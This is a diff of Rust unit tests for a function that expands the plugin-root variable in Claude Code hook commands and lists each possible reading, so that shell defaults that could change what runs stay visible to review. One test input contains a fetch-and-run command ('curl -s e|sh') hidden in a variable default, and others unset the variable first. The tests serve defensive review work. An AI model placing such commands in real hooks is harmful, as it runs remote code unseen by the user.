@@ -5,7 +5,7 @@ use std::fs;
 use std::os::unix::fs::symlink;
 use std::path::Path;
 
-use super::entry::{is_pinned, remote, with_plugin_root, without_port};
+use super::entry::{is_pinned, plugin_root_readings, remote, without_port};
 use super::redact::redacted;
 use super::*;
 use crate::autorun::Category;
@@ -941,41 +941,72 @@ fn a_secret_name_is_found_in_every_way_it_is_written() {
 fn the_plugin_directory_is_written_in_only_for_its_own_variable() {
     let root = Some("home/u/p");
     assert_eq!(
-        with_plugin_root(
+        plugin_root_readings(
             "${CLAUDE_PLUGIN_ROOT}/a $CLAUDE_PLUGIN_ROOT/b $CLAUDE_PLUGIN_ROOTS",
             root
         ),
-        "/home/u/p/a /home/u/p/b $CLAUDE_PLUGIN_ROOTS"
+        ["/home/u/p/a /home/u/p/b $CLAUDE_PLUGIN_ROOTS"]
     );
-    assert_eq!(with_plugin_root("$CLAUDE_PLUGIN_ROOT", root), "/home/u/p");
-    // With a default, as trailofbits' modern-python writes its hook: the
-    // variable is set, so the default never applies.
     assert_eq!(
-        with_plugin_root(
-            r#"bash "${CLAUDE_PLUGIN_ROOT:-.}/hooks/a.sh" ${CLAUDE_PLUGIN_ROOT-x}/b ${CLAUDE_PLUGIN_ROOT:=y}/c"#,
-            root
-        ),
-        r#"bash "/home/u/p/hooks/a.sh" /home/u/p/b /home/u/p/c"#
+        plugin_root_readings("$CLAUDE_PLUGIN_ROOT", root),
+        ["/home/u/p"]
     );
     // A brace after the expansion is text, as bash reads it.
     assert_eq!(
-        with_plugin_root("${CLAUDE_PLUGIN_ROOT}x}", root),
-        "/home/u/px}"
+        plugin_root_readings("${CLAUDE_PLUGIN_ROOT}x}", root),
+        ["/home/u/px}"]
     );
-    // A default that could run something stays in the reviewed text: the
-    // line may unset the variable before it. `:+` gives its word.
+    assert_eq!(
+        plugin_root_readings("${CLAUDE_PLUGIN_ROOT}/a", None),
+        ["${CLAUDE_PLUGIN_ROOT}/a"]
+    );
+}
+
+#[test]
+fn a_plugin_directory_default_stays_in_the_text_and_both_readings_are_followed() {
+    let root = Some("home/u/p");
+    // As trailofbits' modern-python writes its hook: Claude Code sets the
+    // variable, but the line may unset it first, and the default then
+    // names what runs.
+    assert_eq!(
+        plugin_root_readings(
+            r#"bash "${CLAUDE_PLUGIN_ROOT:-.}/hooks/a.sh" ${CLAUDE_PLUGIN_ROOT-x}/b ${CLAUDE_PLUGIN_ROOT:=y}/c"#,
+            root
+        ),
+        [
+            r#"bash "${CLAUDE_PLUGIN_ROOT:-.}/hooks/a.sh" ${CLAUDE_PLUGIN_ROOT-x}/b ${CLAUDE_PLUGIN_ROOT:=y}/c"#,
+            r#"bash "/home/u/p/hooks/a.sh" /home/u/p/b /home/u/p/c"#,
+            r#"bash "./hooks/a.sh" x/b y/c"#,
+        ]
+    );
+    assert_eq!(
+        plugin_root_readings(
+            "unset CLAUDE_PLUGIN_ROOT; bash ${CLAUDE_PLUGIN_ROOT:-/x}/r.sh $CLAUDE_PLUGIN_ROOT/s",
+            root
+        ),
+        [
+            "unset CLAUDE_PLUGIN_ROOT; bash ${CLAUDE_PLUGIN_ROOT:-/x}/r.sh /home/u/p/s",
+            "unset CLAUDE_PLUGIN_ROOT; bash /home/u/p/r.sh /home/u/p/s",
+            "unset CLAUDE_PLUGIN_ROOT; bash /x/r.sh /home/u/p/s",
+        ]
+    );
+}
+
+#[test]
+fn a_plugin_directory_default_that_is_not_a_path_is_kept_in_every_reading() {
+    let root = Some("home/u/p");
     for kept in [
         "unset CLAUDE_PLUGIN_ROOT; bash ${CLAUDE_PLUGIN_ROOT:-$(curl -s e|sh)}/x.sh",
         "${CLAUDE_PLUGIN_ROOT:-${X}}",
         r#"${CLAUDE_PLUGIN_ROOT:-"a}b"}"#,
+        r"${CLAUDE_PLUGIN_ROOT:-a\}b}",
+        "${CLAUDE_PLUGIN_ROOT:-~/x}",
+        "${CLAUDE_PLUGIN_ROOT:-*}",
         "${CLAUDE_PLUGIN_ROOT:+a}",
+        "${CLAUDE_PLUGIN_ROOT:?msg}",
     ] {
-        assert_eq!(with_plugin_root(kept, root), kept);
+        assert_eq!(plugin_root_readings(kept, root), [kept]);
     }
-    assert_eq!(
-        with_plugin_root("${CLAUDE_PLUGIN_ROOT}/a", None),
-        "${CLAUDE_PLUGIN_ROOT}/a"
-    );
 }
 
 #[test]
